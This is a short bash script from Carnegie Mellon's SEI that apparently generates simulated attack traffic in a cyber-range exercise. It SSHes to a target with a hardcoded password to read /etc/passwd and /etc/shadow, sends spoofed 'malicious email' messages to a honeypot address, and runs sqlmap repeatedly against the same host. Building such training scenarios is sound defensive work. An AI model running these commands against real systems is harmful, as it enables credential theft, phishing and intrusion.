#!/bin/bash

# Copyright 2025 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.


sleep 120

user=`vmtoolsd --cmd "info-get guestinfo.user"`
domain=`vmtoolsd --cmd "info-get guestinfo.domain"`

ip addr flush dev ens34
ip addr add 123.45.67.206/24 dev ens34
#ip route add 123.45.67.89 via 128.1.1.1 dev ens34
timeout 15 sshpass -p 'password123' ssh -b 123.45.67.206 -o StrictHostKeyChecking=no $user@123.45.67.89 "cat /etc/passwd"
sleep 5
timeout 15 sshpass -p 'password123' ssh -b 123.45.67.206 -o StrictHostKeyChecking=no $user@123.45.67.89 "cat /etc/shadow"
sleep 5
timeout 15 sshpass -p 'password123' ssh -b 123.45.67.206 -o StrictHostKeyChecking=no $user@123.45.67.89 "hostname"
sleep 5
swaks --to victim@honeypot.com --from attacker@$domain --server 123.45.67.89 --header "Subject: Malicious email" --body "Click the attached malicious file please"
sleep 5
swaks --to victim@honeypot.com --from attacker@$domain --server 123.45.67.89 --header "Subject: Malicious email" --body "Click the attached malicious file please"
sleep 5
swaks --to victim@honeypot.com --from attacker@$domain --server 123.45.67.89 --header "Subject: Malicious email" --body "Click the attached malicious file please"
sleep 5
sqlmap -u "http://123.45.67.89" --batch
sqlmap -u "http://123.45.67.89" --batch
sqlmap -u "http://123.45.67.89" --batch
sqlmap -u "http://123.45.67.89" --batch
sqlmap -u "http://123.45.67.89" --batch
sleep 5
ip addr flush dev ens34
ip link set dev ens34 down



